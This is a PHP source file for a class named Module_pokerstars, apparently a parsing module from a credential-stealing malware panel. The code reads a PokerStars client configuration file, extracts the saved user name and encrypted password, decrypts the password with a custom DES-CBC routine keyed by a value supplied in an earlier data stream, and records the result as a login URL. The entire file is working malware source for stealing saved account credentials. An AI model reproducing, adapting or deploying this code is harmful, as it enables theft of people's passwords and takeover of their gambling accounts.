<?php

	class Module_pokerstars extends Module_
	{
		private function Decrypt($Password, $Key)
		{
			if(strlen($Password) < 2)
				return '';
			
			$Result = $Password;
			$a_ = 0;
			$i = 0;
			$ErrorOld = error_reporting(NULL);
			while(strlen($Password) > $i)
			{
				$b = NULL;
				$a = NULL;
				
				$b = $Password[$a_++];
				$a = $Password[$a_++];

				if(!strlen($a) || !strlen($b))
					break;
				
				$Result[$i++] = chr(((ord($b) - 0x23) << 4) + ord($a));
			}
			error_reporting($ErrorOld);
			
			$Cipher_ = MCRYPT_DES;
			$CipherM = MCRYPT_MODE_CBC;

			$KeySize = mcrypt_get_key_size($Cipher_, $CipherM);
			$IV_Size = mcrypt_get_iv_size ($Cipher_, $CipherM);

			$GenData = '';
			do
			{
				$GenData = $GenData.md5($GenData.$Key, true);
			} 
			while(strlen($GenData) < ($KeySize + $IV_Size));


			$Key_ = substr($GenData, 0, $KeySize);
			$IV_  = substr($GenData, $KeySize, $IV_Size);

			$PlainText = mcrypt_decrypt($Cipher_, $Key_, $Result, $CipherM, $IV_ );
			return substr($PlainText, 0, $i);
		}
	
		protected function FixPassword($Pass, $User)
		{
			return substr($Pass, 0, strlen($Pass) - strlen(strstr($Pass, $User)));
		}
		
		function ProcessFile($Source)
		{
			$INI_ = parse_ini($Source);
			if(!$INI_)
				return NULL;
			
			$User = $INI_['User']['Name'];
			$Pass = '';
			
			if(isset($INI_['User']['PWD']))
				$Pass = $INI_['User']['PWD'];
			
			$Key = $this->get_options("Key");
			if($Key != NULL && strlen($Pass))
			{
				$Pass = $this->FixPassword($this->Decrypt(trim($Pass), trim($Key)), $User);
				$this->insert_other("https://" . $User . ":" . $Pass . "@pokerstars.com");
			}
			
			$INI_ = NULL;
		}
		
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$Stream = new Stream($Data);
					$this->set_options("Key", trim($Stream->GetSTRING_()));
					$Stream = NULL;
					break;
				case 1:
					$this->ProcessFile($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}